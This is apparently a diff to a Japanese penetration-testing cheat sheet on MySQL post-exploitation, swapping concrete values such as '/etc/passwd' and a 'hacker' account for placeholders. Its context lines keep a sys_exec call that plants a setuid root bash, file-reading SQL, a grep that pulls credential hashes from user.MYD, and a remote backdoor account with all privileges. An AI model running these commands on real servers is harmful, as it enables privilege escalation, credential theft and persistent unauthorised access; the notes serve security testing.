@@ -7,7 +7,6 @@
 
 ---
 
-- [ ] Todo：以降編集
 # 着目ファイル一覧
 
 | カテゴリ | ファイル名                    | 用途・重要性                          | 診断・解析時の注目点                                                          |
@@ -176,13 +175,13 @@ SELECT sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 
 ファイルの読み取り
 ```sql
-SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('<file_path>');
 ```
 
 ローカルファイルからのデータインポート
 ```sql
 CREATE TABLE test(entry TEXT);
-LOAD DATA LOCAL INFILE "/etc/passwd" INTO TABLE test FIELDS TERMINATED BY '\n';
+LOAD DATA LOCAL INFILE "<file_path>" INTO TABLE test FIELDS TERMINATED BY '\n';
 SELECT * FROM test;
 ```
 
@@ -207,8 +206,8 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
 ## ユーザー追加（バックドア作成）
 
 ```sql
-CREATE USER 'hacker'@'%' IDENTIFIED BY 'P@ssw0rd123';
-GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' WITH GRANT OPTION;
+CREATE USER '<username>'@'%' IDENTIFIED BY '<password>';
+GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
 ```
 
@@ -262,5 +261,3 @@ FLUSH PRIVILEGES;
 -- 削除はDROP USER '<username>'@'%';
 ```
 - `@'%'`を指定しないと、デフォルトで `@'localhost'`になり、リモート接続できない
-
----
